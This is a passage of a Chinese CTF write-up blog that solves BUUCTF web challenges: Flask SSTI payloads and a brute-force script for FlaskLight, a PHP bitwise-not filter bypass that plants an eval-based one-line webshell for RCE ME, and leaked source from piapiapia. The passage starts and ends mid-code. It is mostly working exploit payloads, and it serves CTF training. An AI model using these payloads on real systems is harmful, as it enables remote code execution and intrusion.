class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br><br><span class="hljs-comment">#938-308-727</span><br></code></pre></td></tr></table></figure><p>在报错界面点右侧那个小黑方框，输入得到的<code>PIN</code>就能进入交互式终端了：</p><p><img src="/img/flaskapp7.png" alt="flaskapp7"></p><p>拿到<code>flag</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"># 其它payload，参考了https://blog.csdn.net/rfrder/article/details/110240245</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](<span class="hljs-name">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-name">&#x27;/&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::-1],<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p><img src="/img/flasklight1.png" alt="flasklight1"></p><p>估计<code>SSTI</code>，源码中有如下提示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Parameter Name: search --&gt;</span><br><span class="hljs-comment">&lt;!-- Method: GET --&gt;</span><br></code></pre></td></tr></table></figure><p><code>/?search=&#123;&#123;7*7&#125;&#125;</code>回显<code>49</code>，存在<code>SSTI</code></p><p><code>?search=&#123;&#123;''.__class__.__base__.__base__.__subclasses__()&#125;&#125;</code>:</p><p><img src="/img/flasklight2.png" alt="flasklight2"></p><p>可以看到目前我们没碰到任何过滤，有很多方法去执行命令：</p><p><code>payload1</code>:(需要脚本去找可以调用<code>os</code>模块的类)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    url = <span class="hljs-string">&quot;http://9311a17d-d080-40a8-a7f2-83bda4f35d3f.node4.buuoj.cn:81/?search=%7B%7B&#x27;&#x27;.__class__.__base__.__base__.__subclasses__()[&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;]%7D%7D&quot;</span>  <span class="hljs-comment"># 注意这里不能直接加i</span><br><br>    s = requests.get(url=url)<br>    time.sleep(<span class="hljs-number">0.06</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Print&#x27;</span> <span class="hljs-keyword">in</span> s.text:<br>        <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment">#注意url那里一定要双引号包裹。。</span><br><br><span class="hljs-comment"># 71</span><br></code></pre></td></tr></table></figure><p>然后利用<code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code>去访问这个模块并执行函数：</p><p><img src="/img/flasklight3.png" alt="flasklight3"></p><p>出现了<code>500</code>，<code>__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</code>这部分应该触发了过滤，我们按顺序试试关键字发现<code>globals</code>被过滤了，使用字符串拼接绕过：</p><p><code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()&#125;&#125;</code></p><p><img src="/img/flasklight4.png" alt="flasklight4"></p><p>然后改变命令去找文件就行</p><p><code>flag&#123;7395b568-25c5-47b8-914a-7338fc453ec2&#125;</code></p><p><code>payload2</code>:</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> b <span class="hljs-keyword">in</span> c.__init__[<span class="hljs-string">&#x27;__glo&#x27;</span>+<span class="hljs-string">&#x27;bals__&#x27;</span>].values() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> b.__class__ == &#123;&#125;.__class__ <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> b.keys() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; b[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flasklight/coomme_geeeett_youur_flek&quot;).read()&#x27;</span>) &#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p>最后看下<code>popen</code>和<code>open</code>的区别：</p><p><img src="/img/flasklight6.png" alt="flasklight6"></p><p>如果我们要去读某个已知的文件，可以选择用<code>open</code>，它不要求我们去寻找某个调用<code>os</code>模块的类，但如果我们想执行命令，还是要用<code>popen</code>。</p><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>                                                &#125;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>                                                &#125;<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// ?&gt;</span><br></code></pre></td></tr></table></figure><p>代码很好理解，不过它不光限制了<code>code</code>的长度，而且正则匹配了所有大小写字母加数字？要怎么构建<code>payload</code>？</p><p>网上查了一下<code>RCE过滤字母和数字</code>：<code>https://xz.aliyun.com/t/11929</code></p><p>主要有异或、自增、取反三种方法。取反好理解而且比较短，尝试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ans1</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<span class="hljs-comment">//函数名</span><br><span class="hljs-variable">$ans2</span>=<span class="hljs-string">&#x27;ls&#x27;</span>;<span class="hljs-comment">//命令</span><br><span class="hljs-variable">$data1</span>=(<span class="hljs-string">&#x27;~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$ans1</span>));<span class="hljs-comment">//通过两次取反运算得到system</span><br><span class="hljs-variable">$data2</span>=(<span class="hljs-string">&#x27;~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$ans2</span>));<span class="hljs-comment">//通过两次取反运算得到dir</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;(&#x27;</span>.<span class="hljs-variable">$data1</span>.<span class="hljs-string">&#x27;)&#x27;</span>.<span class="hljs-string">&#x27;(&#x27;</span>.<span class="hljs-variable">$data2</span>.<span class="hljs-string">&#x27;)&#x27;</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>结果传给<code>code</code>没有任何回显，估计触发了什么关键字，尝试用一句话木马连接：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;assert&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;eval($_REQUEST[1]);&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//https://www.cnblogs.com/Article-kelp/p/14704975.html</span><br>    <br></code></pre></td></tr></table></figure><p><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);</code></p><p><code>POST</code>传<code>1=phpinfo();</code>(<code>PHP Version 7.0.33</code>)，在<code>disable_functions</code>中发现禁用了大量函数：</p><p><img src="/img/qvfan1.png" alt="qvfan1"></p><p>后面有两种解法：</p><p>1.就是利用蚁剑中这个插件(注意要在<code>Linux</code>下使用，安装可以参考<code>[Bypass - 蚁剑菜刀虚拟终端执行命令返回ret=127 | CN-SEC 中文网](https://cn-sec.com/archives/1878964.html)</code>)：</p><p><img src="/img/rceme6.png" alt="rceme6"></p><p><img src="/img/rceme7.png" alt="rceme7"></p><p><img src="/img/rceme5.png" alt="rceme5"></p><p><code>flag&#123;3a24f812-7171-4308-a702-d7a77fd2c2cd&#125;</code></p><p><strong>eval函数中参数是字符</strong>，<strong>assert函数中参数为表达式 （或者为函数</strong></p><p><code>https://www.cnblogs.com/NoCirc1e/p/16275602.html</code></p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>是个登录界面，一开始以为sql注入，但尝试后发现不存在注入点。</p><p><code>www.zip</code>泄露(还挺多的)：</p><p><img src="/img/pia1.png" alt="pia1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &#123; <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &gt; <span class="hljs-number">16</span>) <span class="hljs-comment">//限制了用户名和密码的长度</span><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid password&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$username</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name or password&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">mysql</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_exists</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$key_list</span> = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br><span class="hljs-variable">$value_list</span> = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> &amp;&amp; <span class="hljs-variable">$object</span>-&gt;password === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>-&gt;profile;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> __class__;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$link</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"><span class="hljs-variable">$config</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-title function_ invoke__">mysql_connect</span>(<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>],<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>]);<br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;link;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$ret</span> = <span class="hljs-string">&#x27;*&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT <span class="hljs-subst">$ret</span> FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$this</span>-&gt;link);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_fetch_object</span>(<span class="hljs-variable">$result</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span></span>) </span>&#123;<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$key_list</span>);<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;\&#x27;&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="hljs-variable">$value_list</span>) . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>; <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO <span class="hljs-subst">$table</span> (<span class="hljs-subst">$key</span>) VALUES (<span class="hljs-subst">$value</span>)&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span 